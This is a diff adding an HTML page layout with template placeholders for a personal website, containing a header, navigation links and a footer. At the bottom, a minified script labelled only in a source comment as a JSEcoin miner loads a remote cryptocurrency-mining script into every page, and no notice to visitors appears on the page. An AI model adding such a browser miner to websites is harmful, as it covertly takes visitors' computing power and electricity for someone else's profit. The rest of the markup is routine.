@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+	
+		<meta charset="UTF-8">
+		
+		<title>{{ page.title }}</title>
+		
+		<meta name="google-site-verification" content="6R1p_42qJ1bZwnkrUvM1nuD7f7P7Ox7b-1m84ylgnPs" />
+		
+		<meta name="msvalidate.01" content="AAD028C2F09686DECB9CF466658BDFC9" />
+		
+		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+		
+		<link rel="stylesheet" type="text/css" href="/stylesheet.css">
+		
+	</head>
+	
+	<body>
+	
+		<header>
+			<h1><a href="/" class="heading">{{ page.title }}</a></h1>
+			<h2>By Anders Meadwell</h2>
+			
+			<!-- navbar begins here -->
+			<nav>
+				<ul style="margin-right: 20px; margin-left: 20px; padding-right: 0px; padding-left: 0px;">
+					<li style="margin-right: 0px;"><a href="/">Home</a></li>
+					<li style="margin-left: 0px; margin-right: 0px;"><a href="/about">About</a></li>
+					<li style="margin-left: 0px; margin-right: 0px;"><a href="/blog">Blog</a></li>
+					<li style="margin-left: 0px; margin-right: 0px;"><a href="/contact">Contact</a></li>
+					<li style="margin-left: 0px;"><a href="/donate">Donate</a></li>
+					<!-- remember to add class "active" to current page on nav bar -->
+				</ul>
+			</nav>
+			
+			<br>
+			<br>
+			<hr>
+		</header>
+		
+		<main>
+			{{ content }}
+		</main>
+		
+		<footer>
+			<hr>
+			<p>&copy 2018 Anders Meadwell</p>
+		</footer>
+		
+		<!-- this is JSEcoin miner -->
+		<script type="text/javascript">
+			!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/103615/protracker.tk/0/0/",s.parentNode.insertBefore(t,s)}();
+		</script>
+		
+	</body>
+</html>
